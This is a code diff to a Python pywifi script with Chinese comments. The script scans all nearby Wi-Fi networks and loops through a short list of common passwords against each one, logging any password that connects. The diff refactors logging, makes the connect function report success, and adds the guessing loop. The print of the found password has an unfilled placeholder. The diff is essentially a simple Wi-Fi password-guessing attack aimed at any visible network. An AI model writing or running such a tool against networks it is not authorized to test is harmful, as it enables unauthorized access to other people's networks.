@@ -4,9 +4,10 @@
 import pywifi
 from pywifi import const  # 获取连接状态的常量库
 import time
-from utils.log_utils import SingletonLog
+import logging
 
-logger = SingletonLog().get_logger()
+logger = logging.getLogger()
+logger.setLevel(logging.DEBUG)
 
 """
 解决pywifi模块不支持mac系统的问题
@@ -46,15 +47,25 @@ class MyWifi:
         self.ifaces.connect(tmp_profile)  # 连接
         if self.ifaces.status() == const.IFACE_CONNECTED:
             logger.info(f"wifi【{wifi_name}】的密码是{password}")
+            self.ifaces.disconnect()  # 断开连接
+            return True
         else:
-            logger.info("错误的密码")
-        # self.ifaces.disconnect()  # 断开连接
+            # logger.info("错误的密码")
+            return False
 
 
 if __name__ == '__main__':
-    m = MyWifi()
-    for i in m.get_wifi_name():
-        m.conn_wifi(i, '12345678')
+    passwords = ["12345678", "88888888", "123456789"]
 
-    # MyWifi().get_wifi_name()
-    # MyWifi().conne_wifi("wifi007", '1234567899')
+    m = MyWifi()
+    for name in m.get_wifi_name():
+        if name is None:
+            continue
+        for pw in passwords:
+            try:
+                if m.conn_wifi(name, pw):
+                    print("success get password {}")
+                    break
+            except Exception as e:
+                print(e)
+    print("done")
